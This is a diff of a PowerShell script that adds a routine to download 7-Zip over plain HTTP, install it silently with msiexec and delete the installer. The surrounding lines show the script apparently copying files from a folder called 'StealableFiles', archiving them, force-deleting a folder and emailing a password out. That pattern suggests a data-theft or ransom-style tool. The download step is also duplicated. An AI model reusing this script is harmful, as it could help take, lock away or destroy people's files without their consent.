@@ -2,6 +2,47 @@
 #Modified by: Praneeth Marella
 #Date: April 23 2017
 
+#Install 7zip so it can be used to zip files
+
+$workdir = "c:\installer\"
+
+If (Test-Path -Path $workdir -PathType Container)
+{ Write-Host "$workdir already exists" -ForegroundColor Red}
+ELSE
+{ New-Item -Path $workdir  -ItemType directory }
+
+#Download the installer
+
+$source = "http://www.7-zip.org/a/7z1604-x64.msi"
+$destination = "$workdir\7-Zip.msi"
+
+
+if (Get-Command 'Invoke-Webrequest')
+{
+     Invoke-WebRequest $source -OutFile $destination
+}
+else
+{
+    $WebClient = New-Object System.Net.WebClient
+    $webclient.DownloadFile($source, $destination)
+}
+
+Invoke-WebRequest $source -OutFile $destination 
+
+#Start the installation
+
+msiexec.exe /i "$workdir\7-Zip.msi" /qb
+
+#Wait 20 Seconds for the installation to finish
+
+Start-Sleep -s 20
+
+#Remove the installer
+
+rm -Force $workdir\7*
+
+
+
 #Set source and destination of files to copy and store
 
 $Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
@@ -29,6 +70,8 @@ $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -Wi
 #Delete the destination folder
 
 $del = Remove-Item $Destination -Force -Recurse
+
+
 
 #Send password for files to your e-mail
 
